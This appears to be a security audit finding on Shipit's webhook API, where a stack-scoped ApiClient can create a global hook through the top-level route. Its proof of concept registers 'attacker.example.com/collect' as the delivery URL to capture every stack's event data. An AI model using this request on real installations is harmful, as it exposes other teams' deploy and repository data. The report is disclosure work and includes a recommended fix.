### Title
Stack-scoped ApiClient can create a global webhook and read every other stack's deploy/task/merge events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` decides whether a webhook is "global" (fires for every stack) or "scoped" (fires only for one stack) purely from the *request path* (`params[:stack_id]` present or not), never from the authorization scope that was actually granted to the calling `ApiClient`. An `ApiClient` that is deliberately restricted to a single stack (`ApiClient#stack_id?` true, `Shipit::Api::BaseController#stacks` limited to `Stack.where(id: current_api_client.stack_id)`) can still hit the un-scoped route `POST /api/hooks` (declared in `config/routes.rb` as a top-level `resources :hooks`) and create a `Hook` with `stack_id: nil`. That hook is delivered for `stack`, `review_stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events for **every** stack in the installation via `Hook.deliver(event, stack_id, payload)` / `Hook.for_stack`.

### Finding Description
This is the same class of bug as the referenced report: a value that authorizes an action (the aave-token flag that should govern which underlying asset gets credited) is checked in one code path but silently ignored in another, so funds/data end up flowing to the wrong place. Here, the "authorizing value" is `current_api_client.stack_id`, and the "value acted on" is the `stack_id` used to scope the created `Hook`.

- `ApiClient#stack_id?` / `belongs_to :stack, optional: true` encodes the intended authorization boundary: a scoped client should only ever be able to touch its own stack. [1](#0-0) 
- `Shipit::Api::BaseController#stacks` correctly narrows the stack set for scoped clients: [2](#0-1) 
- But `Shipit::Api::HooksController#stack_id` (the private method used to build the `Hook.where(stack_id:)` scope for both listing and creation) computes the target `stack_id` **only from `params[:stack_id]`**, never from `current_api_client.stack_id`: [3](#0-2) 
- `config/routes.rb` exposes both a stack-scoped hooks route and an un-scoped, top-level one that maps to the very same controller/action: [4](#0-3) 
- When the top-level `/api/hooks` route is used, `params[:stack_id]` is absent, so `stack_id` returns `nil`, and `hooks.create(params)` builds a `Hook.where(stack_id: nil).create(...)`, i.e. a **global** hook, entirely bypassing the `stacks`/`current_api_client.stack_id?` restriction that governs every other controller in the `Api` namespace (`StacksController`, `TasksController`, `DeploysController`, `LocksController`, `MergeRequestsController` all call `stack` which is derived from `stacks.from_param!`).
- Only `require_permission :write, :hook` is checked before `create`; there is no check that the client's `stack_id` (if scoped) matches the hook being created: [5](#0-4) 
- Once created, this global `Hook` receives deliveries for **all** stacks through `Hook.deliver`/`for_stack`, and the payload is emitted from every stack's lifecycle events (`Hook.emit`), which includes serialized model data (commits, tasks, deploys, users, merge requests) via `coerce_payload`: [6](#0-5) [7](#0-6) 

**Binding broken:** `current_api_client.stack_id` (the stack the ApiClient token authorizes) ≠ `Hook#stack_id` (the stack whose events the created hook actually touches). The equality that should hold — "a scoped ApiClient can only create/read hooks for the stack it's scoped to" — is broken because `HooksController#stack_id` never consults `current_api_client.stack_id?`/`current_api_client.stack_id`.

### Impact Explanation
A stack-scoped `ApiClient` (e.g. one created for CI to manage a single repository's hooks, holding only `write:hook`) can register an attacker-controlled `delivery_url` as a **global** hook. From then on, every deploy, rollback, task, lock, merge, commit-status and pull-request event for **every stack hosted by that Shipit instance** — including stacks/repositories the token was never authorized to see — is POSTed (with a payload built by `Hook.coerce_payload`, containing serialized model attributes) to that external URL. This is an unauthenticated read of stack state / task/deploy metadata across repositories the caller has no authorization for, i.e. exactly the kind of authorization-scope violation the engine's per-client `stack_id` restriction exists to prevent, satisfying the "High: escalation ... unauthenticated read of stack state, task streams or deploy output" bucket.

### Likelihood Explanation
Requires only a valid, but narrowly-scoped, `ApiClient` bearer token with the `write:hook` permission (a routine, low-privilege credential intentionally issued for single-stack automation, e.g. via `CCMenuUrlController`-style flows or manual admin issuance). No other privilege, GitHub credential, or session is needed — a single unauthenticated-w.r.t.-other-stacks POST to `/api/hooks` (not the nested `/api/stacks/:stack_id/hooks` route) triggers the issue. This is a straightforward, deterministic exploitation path with no race conditions or timing dependencies.

### Recommendation
In `Shipit::Api::HooksController`, derive the effective `stack_id` from the authenticated `current_api_client` when it is stack-scoped, rather than trusting `params[:stack_id]` alone, e.g.:
```ruby
def stack_id
  return current_api_client.stack_id if current_api_client.stack_id?
  stack.id if params[:stack_id].present?
end
```
and reject (403/422) any request where a scoped client supplies a `stack_id` param different from its own, or omits it while attempting to hit the global route. More generally, `BaseController#stacks`/`#stack` should be the single source of truth consulted by every sub-resource controller (including `HooksController`), and any controller that builds its own scoping (as `HooksController#hooks` does) must reuse that scope rather than re-deriving it from raw params.

### Proof of Concept
1. As an admin, create an `ApiClient` scoped to `stack: shipit` (fixture-equivalent of `here_come_the_walrus`) with `permissions: ['write:hook']`.
2. Authenticate as that client and call:
   ```
   POST /api/hooks
   Authorization: Basic <api_client_token>
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "task", "merge_status", "commit_status"]
   }
   ```
   This hits the top-level `resources :hooks` route (not the `/api/stacks/:stack_id/hooks` nested one), so `params[:stack_id]` is absent.
3. `HooksController#stack_id` returns `nil` (no consultation of `current_api_client.stack_id`), so `hooks.create(params)` creates `Hook.new(stack_id: nil, delivery_url: "https://attacker.example.com/collect", events: [...])` — a global hook.
4. Any deploy/task/merge event on *any other stack* in the installation (which this client was never authorized to read, per `BaseController#stacks`) now triggers `DeliverHookJob` to `https://attacker.example.com/collect` with that stack's serialized event payload, confirmed by `Hook.deliver`/`Hook.for_stack(stack_id)` matching `stack_id: nil` hooks against every stack's `stack_id`.
